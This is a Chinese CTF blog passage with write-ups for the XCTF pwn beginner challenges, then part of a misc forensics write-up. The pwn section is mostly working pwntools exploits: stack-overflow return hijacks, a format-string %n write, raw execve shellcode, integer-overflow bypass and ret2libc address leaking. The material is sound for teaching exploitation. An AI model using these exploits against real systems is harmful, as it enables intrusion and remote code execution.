<p>和上一题一样这也是个栈溢出，直接写exp了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">49767</span>)</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lets get helloworld for bof\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387363510.png" class="" width="1566387363510">
<h1 id="level0">level0</h1>
<p>题目描述：菜鸡了解了什么是溢出，他相信自己能得到shell</p>
<p>先看源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387434974.png" class="" width="1566387434974">
<p>main函数没什么好看的，看vulnerable_function()：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387511798.png" class="" width="1566387511798">
<p>好像没啥啊，但这时候我注意到其他的函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387903715.png" class="" width="1566387903715">
<p>看到了一个callsystem函数，地址为0x400596。看一看：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566387945520.png" class="" width="1566387945520">
<p>哦吼，要是能让程序执行这个函数，那就很不错了。</p>
<p>所以我们要在函数调用返回的时候修改eip，进行rop攻击。</p>
<p>看一下buf的位置，顺便看一下函数返回的位置，ida告诉我们r代表的就是return
address：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566388464692.png" class="" width="1566388464692">
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566388494019.png" class="" width="1566388494019">
<p>可以看到buf和r之间偏移量为0x88。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">59164</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>获取到shell，得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566388809423.png" class="" width="1566388809423">
<h1 id="level2">level2</h1>
<p>题目描述：菜鸡请教大神如何获得flag，大神告诉他‘使用`面向返回的编程`(ROP)就可以了’</p>
<p>先看源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566389051208.png" class="" width="1566389051208">
<p>和上一题一样，主函数还是啥都没有，看别的函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566389080262.png" class="" width="1566389080262">
<p>这次我们看到有程序中直接就有系统调用的函数system()，那如果里面的参数是“/bin/sh”就好了，找一下程序中有没有我们想要的“/bin/sh”。搜索方式为IDA里依次点击<strong>Search
-&gt; text -&gt; 输入你要搜索的字符串 -&gt; ok</strong></p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566389357722.png" class="" width="1566389357722">
<p>找到了，那么我们思路是把函数返回的地址改为上一行的system()，地址为0x0804845c，再把参数变成我们需要的“/bin/sh”。</p>
<p>看一下偏移量：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566390216756.png" class="" width="1566390216756">
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566390240220.png" class="" width="1566390240220">
<p>buf到r的距离是0x88+4。</p>
<p>写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">38299</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x0804845c</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#也可以直接找system函数的位置：</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;../files/level2&#x27;)</span></span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27; * (0x88 + 4) + p32(e.symbols[&#x27;system&#x27;]) + &#x27;a&#x27; * 4 +  p32(0x0804A024)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>拿到shell，得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566389962549.png" class="" width="1566389962549">
<h1 id="guess_num">guess_num</h1>
<p>题目描述：菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</p>
<p>先看源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566390387211.png" class="" width="1566390387211">
<p>发现要猜对十次数字就可以拿到flag（sub_C3E就是cat
flag）。而数字是随机数。这里有一个小知识点，实际上所谓的“随机”是“伪随机”，是根据一个数（我们可以称它为种子，也就是代码中的seed）为基准以某个递推公式推算出来的一系列数。所以说只要知道了seed，那么生成的数我们也就能知道了。</p>
<p>因此，思路是要能知道seed的值，我们看第19行的seed是什么：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566390734126.png" class="" width="1566390734126">
<p>看来我们是不可能知道seed是什么了，那就只能我们自己修改seed，同样是栈溢出，我们可以控制的是v9，看一下v9：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566390934659.png" class="" width="1566390934659">
<p>v9就是var_30，我们可以看到偏移量为0x20。所以我们修改seed的值，然后我们就知道了每次的数是什么，猜对10次得到flag。</p>
<p>写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">41331</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">c = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">c.srand(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>) <span class="comment">#注意如果输出的方法是printf，那么如果源码中没有\n那就不要在exp中写成name:\n，否则会出现问题</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;number:&quot;</span>) </span><br><span class="line">    p.sendline(<span class="built_in">str</span>(c.rand() % <span class="number">6</span> + <span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566392280703.png" class="" width="1566392280703">
<h1 id="cgpwn2">cgpwn2</h1>
<p>题目描述：菜鸡认为自己需要一个字符串</p>
<p>首先分析源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566450714306.png" class="" width="1566450714306">
<p>啥也没有，看一下hello函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566450755009.png" class="" width="1566450755009">
<p>用户可以控制的是name和s，这应该也是栈溢出。观察到程序中有个pwn函数(pwn中的system地址是0x804855A)，看一下：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566450870135.png" class="" width="1566450870135">
<p>参数不是/bin/sh，找了一下程序里也没有。</p>
<p>看一下name，发现是全局变量：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566452807866.png" class="" width="1566452807866">
<p>那就是把name变成/bin/sh然后直接传到system函数里。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">55008</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x26</span> + <span class="number">4</span>) + p32(<span class="number">0x804855A</span>) + p32(<span class="number">0x0804A080</span>)</span><br><span class="line"><span class="comment">#或者直接找system函数的位置</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;../files/cgpwn2&#x27;)</span></span><br><span class="line"><span class="comment">#payload = &#x27;a&#x27; * (0x26 + 4) + p32(e.symbols[&#x27;system&#x27;]) + &#x27;a&#x27; * 4 + p32(0x0804A080)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;here:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>取得shell，得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566450036179.png" class="" width="1566450036179">
<h1 id="string">string</h1>
<p>题目描述：菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</p>
<p>先看主函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566824006101.png" class="" width="1566824006101">
<p>sub_400D72：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566824068004.png" class="" width="1566824068004">
<p>sub_400BB9：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566824117464.png" class="" width="1566824117464">
<p>sub_400CA6：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566824219571.png" class="" width="1566824219571">
<p>我们分析源码，首先看到sub_400CA6的第17行，</p>
<blockquote>
<p>void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</p>
</blockquote>
<p>记住只要看见这种句子，就知道是把v1强制转化成一个函数指针，然后调用这个函数，那么我们就可以利用前面的read，把我们想执行的命令（shellcode）写入v1中，程序就可以执行我们的shellcode。</p>
<p>那么想要能输入v1，我们就要让第12句的if语句成真，也就是*a1 ==
a1[1]。</p>
<p>往上看发现a1是函数传入的参数，再往回看，一直追溯到主函数，发现这个a1实际上是v4，而v4和v3相等，也就是说现在*a1是68，a1[1]是85，我们的目标变成要让*a1为85。</p>
<p>再看到sub_400BB9，发现在第23行存在格式化字符串漏洞，那么就很明确了，用%n赋值。那么*a1的地址是多少呢？发现secret就是*a1的地址。</p>
<p>所以攻击思路如下：</p>
<p>通过格式化字符串漏洞赋值*a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p>
<p>构造exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">40437</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;be\n&#x27;</span>, <span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;up\n&#x27;</span>, <span class="string">&#x27;east&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;leave(0)?:\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;address&#x27;\n&quot;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;is:\n&quot;</span>, <span class="string">&quot;%85c%7$n&quot;</span>)</span><br><span class="line">shellcode= <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;SPELL\n&quot;</span>, shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="int_overflow">int_overflow</h1>
<p>题目描述：菜鸡感觉这题似乎没有办法溢出，真的么?</p>
<p>先看一下保护情况：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566894632726.png" class="" width="1566894632726">
<p>看主函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566894664678.png" class="" width="1566894664678">
<p>没什么东西，看login()：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566894731151.png" class="" width="1566894731151">
<p>好像也没啥东西，接着看check_passwd()：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566894783263.png" class="" width="1566894783263">
<p>strlen存在溢出漏洞，因为32位程序中strlen把结果放在al中，而al是八位的，所以能存的最大值为255（1111
1111），如果超过255，就会导致整形溢出。例如261（1 0000
0101‬）最终输出的结果就是（0000 0101）。</p>
<p>接着看程序，发现有一个what_is_this函数：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566895048032.png" class="" width="1566895048032">
<p>那么就是要通过strlen构造栈溢出让程序返回到这个函数，但是要求输入的s长度在(3,8]之间。所以通过整数溢出来越过这个限制。</p>
<p>看一下s在内存中的位置：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566896638685.png" class="" width="1566896638685">
<p>构造exp如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">32379</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x0804868B</span>)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">261</span>-<span class="built_in">int</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;username:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;passwd:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1566896884187.png" class="" width="1566896884187">
<h1 id="level3">level3</h1>
<p>题目描述：libc!libc!这次没有system，你能帮菜鸡解决这个难题么?</p>
<p>先看源码：</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567078058878.png" class="" width="1567078058878">
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567078099146.png" class="" width="1567078099146">
<p>首先想到read构造栈溢出返回system地址，参数传入“/bin/sh”地址。但是程序中没有system和/bin/sh。</p>
<p>虽然程序中没有直接给出，但是我们可以通过return2libc攻击间接得到。因为几乎所有程序都会运行libc库函数，而libc库中就有system和/bin/sh，libc库中的函数之间的偏移量都是固定的，只要知道了当前程序运行的libc版本和一个libc函数运行时在内存中的绝对地址（例如read或write），就可以推出system和/bin/sh的地址，也就可以通过栈溢出返回到system的地址。</p>
<p>那么read或write的绝对地址是啥？为啥地址不是固定的？可以看看这篇文章：<a
href="https://blog.csdn.net/linyt/article/details/51635768">《聊聊Linux动态链接中的PLT和GOT（１）——何谓PLT与GOT》</a>，大佬写的非常清楚。</p>
<p>所以攻击思路就是先利用程序的write函数输出read运行时候的绝对地址，再通过read找出libc的版本，然后根据偏移量找出system和/bin/sh的地址，再调用vulnerable_function进行栈溢出返回system()。</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">51525</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">vuln = e.symbols[<span class="string">&#x27;vulnerable_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#通过write回显read在内存中的绝对地址</span></span><br><span class="line"><span class="comment">#vuln为后面重新返回到vuln函数进行栈溢出做准备。</span></span><br><span class="line"><span class="comment">#函数调用顺序：func1_addr+func2_addr+...+func1_para+func2_para+...</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(write_plt) + p32(vuln) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_leak = u32(p.recv())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#通过read的绝对地址查询libc版本，得到system和/bin/sh的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_leak)</span><br><span class="line">libc_base = read_leak - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(sys_addr) + p32(<span class="number">4</span>) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行exp，如图，由于程序不确定libc版本，需要手动选择，这里我们选择libc版本选0（我也不知道选啥所以选第一个），得到shell，取得flag。</p>
<img src="/2019/08/29/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567087020922.png" class="" width="1567087020922">
]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界misc新手训练</title>
    <url>/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<h1 id="this_is_flag">this_is_flag</h1>
<p>题目描述：Most flags are in the form flag{xxx}, for
example:flag{th1s_!s_a_d4m0_4la9}</p>
<p>看题目描述就行了。</p>
<h1 id="ext3">ext3</h1>
<p>题目描述：今天是菜狗的生日，他收到了一个linux系统光盘</p>
<p>先搜一下有没有flag明文：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">strings linux | grep flag</span><br></pre></td></tr></table></figure>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565662531551.png" class="" width="1565662531551">
<p>看来flag在txt里，那挂载到系统上看看这个文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mount linux /mnt/sda7</span><br><span class="line">cd /mnt/sda7/O7avZhikgKgbF</span><br><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
<p>得到一串字符：<code>ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</code>，这一看就是base64编码，解码就行了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat flag.txt | base64 -d</span><br></pre></td></tr></table></figure>
<p>得到flag：<code>flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</code></p>
<h1 id="give_you_flag">give_you_flag</h1>
<p>题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p>
<p>给了个gif图，有一帧是二维码，直接暂停就可以了</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565663056074.png" class="" width="1565663056074">
<p>这个二维码没有定位点，需要加上，网上找个定位符截下来拼上去就行了</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565663917760.png" class="" width="1565663917760">
<p>扫出来就完了。<code>flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</code></p>
<h1 id="pdf">pdf</h1>
<p>题目描述：菜猫给了菜狗一张图，说图下面什么都没有</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565664467029.png" class="" width="1565664467029">
<p>看看有没有啥文件夹着</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk pdf.pdf</span><br></pre></td></tr></table></figure>
<p>发现啥也没有，好吧。然后我用Adobe Acrobat打开，是这样的：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565664827126.png" class="" width="1565664827126">
<p>图片中间有个文本框，把图片拖走看看：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565664868748.png" class="" width="1565664868748">
<h1 id="simplerar">SimpleRAR</h1>
<p>题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)</p>
<p>打开压缩包，里面有一个flag.txt，打开一看，说“flag is not
here”<del>废话，怎么可能这么简单啦</del>，打开压缩包的时候有个提示：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565665050123.png" class="" width="1565665050123">
<p>UE打开看看</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565667226044.png" class="" width="1565667226044">
<p>这题我当时做一直没思路，后来看了别人的wp说rar对png的文件类型编码是74，就在flag.txt文件结束，这里是7A，所以改过来就行了</p>
<p>改完出来了图片</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565667434792.png" class="" width="1565667434792">
<p>打开看看，是个空白图片，UE打开发现是个gif，于是改个后缀，有两帧，把两帧保存下来放到Stegsolve切换不同通道看一下，发现在Gray
bits通道中有图像：</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565672807242.png" class="" width="1565672807242">
<p>把两个图片保存下来拼到一起，再补上定位点就可以了</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565673356005.png" class="" width="1565673356005">
<p>得到flag：<code>flag&#123;yanji4n_bu_we1shi&#125;</code></p>
<h1 id="坚持60s">坚持60s</h1>
<p>题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡</p>
<p>给了个躲弹幕的小游戏，说坚持60s，打了好几把，太菜了打不过</p>
<p>拖到Java
Decompiler里反编译一下，在PlaneGameFrame.class里找到了flag</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565674950466.png" class="" width="1565674950466">
<p>提交了一下发现不对，仔细一看原来里面还有个base64加密，解密后再提交就可以了，最后结果：<code>flag&#123;DajiDali_JinwanChiji&#125;</code></p>
<h1 id="gif">gif</h1>
<p>题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机</p>
<p>打开压缩包两个文件夹，_MACOSX好像和mac系统有关系，
不知道要干啥，进入另一个文件夹gif，看到里面全是jpg</p>
<img src="/2019/08/13/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565677029669.png" class="" width="1565677029669">
